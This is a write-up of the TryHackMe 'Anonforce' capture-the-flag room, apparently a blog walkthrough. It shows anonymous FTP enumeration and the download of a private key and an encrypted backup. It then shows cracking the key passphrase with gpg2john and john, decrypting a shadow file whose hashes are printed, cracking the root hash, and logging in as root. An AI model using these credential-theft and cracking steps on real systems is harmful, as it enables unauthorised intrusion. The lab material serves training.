# Anonforce

This [room](https://tryhackme.com/room/bsidesgtanonforce) another simple boot2root kind of a challenge. The main focus of this room is on enumeration as we directly have the access to the file system via FTP and all we need is to do is enumerate in order to gain root access. Also, we need to do some GPG passphrase cracking in order to access some encrypted data.



### Initial Enumeration

The first thing that we need to do after starting the machine is to run an nmap scan against the machine's IP address.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $nmap -A 10.10.94.82
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-20 11:19 IST
Nmap scan report for 10.10.94.82
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Nov 19 21:38 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   93 0        0               0 Nov 19 21:38 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Nov 19 21:38 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Nov 19 21:38 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.91.135
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
|   256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_  256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.86 seconds
```

One thing is pretty clear that we have access to the machines file system via FTP. But we must keep in mind that we have only the FTP access which means that we can't run OS commands like `cat`, `whoami` etc. 

Moving on we can access the machine via FTP by logging in as `anonymous` and search for some interesting files that might turn out to be helpful.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $ftp 10.10.94.82
Connected to 10.10.94.82.
220 (vsFTPd 3.0.3)
Name (10.10.94.82:tester): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   23 0        0            4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Nov 19 21:38 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Nov 19 21:38 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Nov 19 21:38 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Nov 19 21:38 sys
drwxrwxrwt    9 0        0            4096 Nov 19 21:38 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> 
```

As our immediate target is to get the user flag, we can head over to the `/home` directory and check the user files.

```
ftp> cd /home
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 0        0            4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x    3 0        0            4096 Aug 11  2019 ..
-rw-------    1 0        0             117 Aug 11  2019 .bash_history
-rw-r--r--    1 1000     1000          220 Aug 11  2019 .bash_logout
-rw-r--r--    1 1000     1000         3771 Aug 11  2019 .bashrc
drwx------    2 1000     1000         4096 Aug 11  2019 .cache
drwxrwxr-x    2 1000     1000         4096 Aug 11  2019 .nano
-rw-r--r--    1 1000     1000          655 Aug 11  2019 .profile
-rw-r--r--    1 1000     1000            0 Aug 11  2019 .sudo_as_admin_successful
-rw-r--r--    1 0        0             183 Aug 11  2019 .wget-hsts
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> mget user.txt
mget user.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (98.8545 kB/s)
ftp> 
```

We can see that there is a user named `melodias` on the machine and in his directory we can see that `user.txt` file is also present. As we are having an FTP connection we can't use the command `cat`. So, we need to download the file using `mget` on our local machine in order to read it.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $cat user.txt
```

Now, the next task is to escalate our privileges and obtain the root flag.

### Privilege Escalation

We can try some of the basic things that we do for privilege escalation such as checking if there is some odd any cron job running on the machine.

```
ftp> cd /etc
ftp> mget crontab
mget crontab? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for crontab (722 bytes).
226 Transfer complete.
722 bytes received in 0.00 secs (3.2945 MB/s
```

Once downloaded, we can read it's content.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $cat crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

But we don't find anything odd over here. Also, as this is an FTP connection we can't run the `find` command to look for files with specific names and permission, which leaves us with no other option but to enumerate the file system manually.

We can start enumerating files from the root (`/`) and look for any odd file.

```
ftp> cd /
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x   23 0        0            4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Nov 19 21:38 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   91 0        0               0 Nov 19 21:38 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Nov 19 21:38 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Nov 19 21:38 sys
drwxrwxrwt    9 0        0            4096 Nov 19 22:17 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
```

Here, we can see that there is one odd directory named as `notread`.

```
ftp> cd notread
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 .
drwxr-xr-x   23 0        0            4096 Aug 11  2019 ..
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
```

And in that directory we can see there are two files namely `backup.pgp` and `private.asc`. This gives us a direct hint towards PGP cracking. And for that we first need to download both these files on our local system.

```
ftp> mget backup.pgp private.asc
mget backup.pgp? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
226 Transfer complete.
524 bytes received in 0.00 secs (1.0959 MB/s)
mget private.asc? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for private.asc (3762 bytes).
226 Transfer complete.
3762 bytes received in 0.00 secs (13.2388 MB/s)
```

In order to acess the encrypted data, we need to proceed in a defined step (more details can be found [here](https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html)). 

We can directly try to import the `private.asc` key but won't succeed as we don't have the passphrase for the same.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: No passphrase given
gpg: error building skey array: No passphrase given
gpg: error reading 'private.asc': No passphrase given
gpg: import from 'private.asc' failed: No passphrase given
gpg: Total number processed: 0
gpg:              unchanged: 1
gpg:       secret keys read: 1
```

So, our first task is to crack the `private.asc` file to get the passphrase. For doing so, we will need `gpg2john` which can be downloaded from [here](https://github.com/openwall/john). Then we will use it to convert the `asc` file to a format that can be understood by `john`.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce/john]
└──╼ $gpg2john ../private.asc > ../hash_for_john

File ../private.asc
┌─[tester@parrot-virtual]─[~/Downloads/anonforce/john]
└──╼ $cd ..
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $cat hash_for_john 
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::../private.asc
```

Now, we can pass the newly created hash to `john` for cracking. 

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $john hash_for_john 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status

XXXXXXX          (anonforce)
1g 0:00:00:00 DONE 2/3 (2020-11-20 12:36) 1.282g/s 20174p/s 20174c/s 20174C/s lolipop..madalina
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

And here we get the passphrase for importing the `private.asc` key. Now, we can easily import the `private.asc` key.

```
┌─[✗]─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $gpg --import private.asc 
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:              unchanged: 2
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
```

Once our key in imported, we can move ahead to decrypt the `backup.pgp` file.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::
```

From the content of the file it is pretty clear that it is the `shadow` file of the system which contains the password hashes for all the account on the machine. Also, we can see that the password hash for `root` account is present in this file. And the `$6$` at the beginning of the hash indicates that it is a sha512crypt hash. We can directly copy the hash to a new file and then pass it to `john` to get the decrypted password.

```
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $cat hash
$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0
┌─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXX           (?)
1g 0:00:00:01 DONE (2020-11-20 12:48) 0.8130g/s 5827p/s 5827c/s 5827C/s 98765432..emoemo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

So, here we get the password for the `root` account. Now, all that we need to do is log on to the machine as `root` via SSH and read the flag.

```
┌─[✗]─[tester@parrot-virtual]─[~/Downloads/anonforce]
└──╼ $ssh root@10.10.94.82
The authenticity of host '10.10.94.82 (10.10.94.82)' can't be established.
ECDSA key fingerprint is SHA256:5evbK4JjQatGFwpn/RYHt5C3A6banBkqnngz4IVXyz0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.94.82' (ECDSA) to the list of known hosts.
root@10.10.94.82's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# cat /root/root.txt 
```

And there we go. So, we have got the root flag marking the completion of this challenge.

### Reference Links

1. TryHackMe-Anonforce: https://tryhackme.com/room/bsidesgtanonforce
2. Recover Your GPG Passphrase: https://www.ubuntuvibes.com/2012/10/recover-your-gpg-passphrase-using-john.html
3. John Tools: https://github.com/openwall/john